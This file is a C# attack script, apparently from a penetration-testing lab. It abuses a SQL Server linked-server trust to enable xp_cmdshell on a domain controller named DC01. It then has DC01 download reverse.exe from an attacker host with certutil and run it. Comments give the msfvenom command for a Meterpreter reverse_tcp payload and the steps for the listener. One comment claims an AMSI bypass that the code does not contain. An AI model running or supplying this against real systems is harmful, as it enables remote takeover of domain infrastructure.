//Host reverse.exe: Make sure your reverse.exe file is hosted on your web server at the specified httpPort (e.g., http://192.168.45.186:4444/reverse.exe).
//Start Metasploit Listener: Ensure your Metasploit multi/handler is running and configured to catch the windows/x64/meterpreter/reverse_tcp payload on port 443.
//Execute the Script: Run the updated C# application.
//The script will now command the DC01 server to download your executable to C:\Users\Public\ and then execute it, which should trigger a connection back to your Metasploit listener.
//msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.186 LPORT=443 -f exe -o reverse.exe
// This script has an AMSI bypass in it


using System;
using System.Data.SqlClient;
using System.Text;

namespace SQLLinkedRevShell
{
    class Program
    {
        static void Main(string[] args)
        {
            string sqlServer = "192.168.182.6";
            string database = "master";
            string attackerIP = "192.168.45.186";
            int httpPort = 4444; // Port where you are hosting reverse.exe

            string conString = $"Server={sqlServer};Database={database};Integrated Security=True;";

            using (SqlConnection con = new SqlConnection(conString))
            {
                try { con.Open(); Console.WriteLine("Auth success!"); }
                catch (Exception ex) { Console.WriteLine($"Connect failed: {ex.Message}"); return; }

                try
                {
                    string linkedName = "";
                    Console.WriteLine("\nLinked servers:");
                    using (SqlCommand cmd = new SqlCommand("EXEC sp_linkedservers;", con))
                    using (SqlDataReader r = cmd.ExecuteReader())
                    {
                        while (r.Read())
                        {
                            string name = r[0].ToString();
                            Console.WriteLine("Linked SQL server: " + name);
                            if (name.ToUpper().Contains("DC01")) linkedName = name;
                        }
                    }

                    if (string.IsNullOrEmpty(linkedName)) { Console.WriteLine("DC01 not found."); return; }

                    // Enable RPC Out if needed
                    object rpc = new SqlCommand($"SELECT is_rpc_out_enabled FROM sys.servers WHERE name = '{linkedName.Replace("'", "''")}'", con).ExecuteScalar();
                    if (rpc != null && Convert.ToInt32(rpc) == 0)
                    {
                        ExecuteNonQuery(con, $"EXEC sp_serveroption '{linkedName.Replace("'", "''")}', 'rpc out', 'true';");
                    }

                    // Enable xp_cmdshell on DC01
                    ExecuteNonQuery(con, $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{linkedName}]");
                    ExecuteNonQuery(con, $"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linkedName}]");

                    // =================================================================
                    // NEW PAYLOAD TO DOWNLOAD AND EXECUTE reverse.exe
                    // =================================================================

                    // Define the web URL and the destination path on the target
                    string payloadUrl = $"http://{attackerIP}:{httpPort}/reverse.exe";
                    string destinationPath = "C:\\Users\\Public\\reverse.exe";

                    // Construct the command to download and execute the .exe
                    // We use cmd.exe to chain the download (certutil) and execution.
                    string downloadCommand = $"certutil -urlcache -f {payloadUrl} {destinationPath}";
                    string executeCommand = destinationPath;
                    string finalCommand = $"cmd /c \"{downloadCommand} && {executeCommand}\"";

                    // Execute the final command on the linked server.
                    // No Base64 encoding is needed for this simple cmd command.
                    ExecuteNonQuery(con, $"EXEC ('xp_cmdshell ''{finalCommand}''') AT [{linkedName}]");

                    Console.WriteLine("Command to download and execute reverse.exe sent to DC01.");
                }
                catch (Exception ex) { Console.WriteLine($"Error: {ex.Message}"); }
            }
        }

        static void ExecuteNonQuery(SqlConnection con, string query)
        {
            using (SqlCommand cmd = new SqlCommand(query, con))
            {
                cmd.ExecuteNonQuery();
            }
        }
    }
}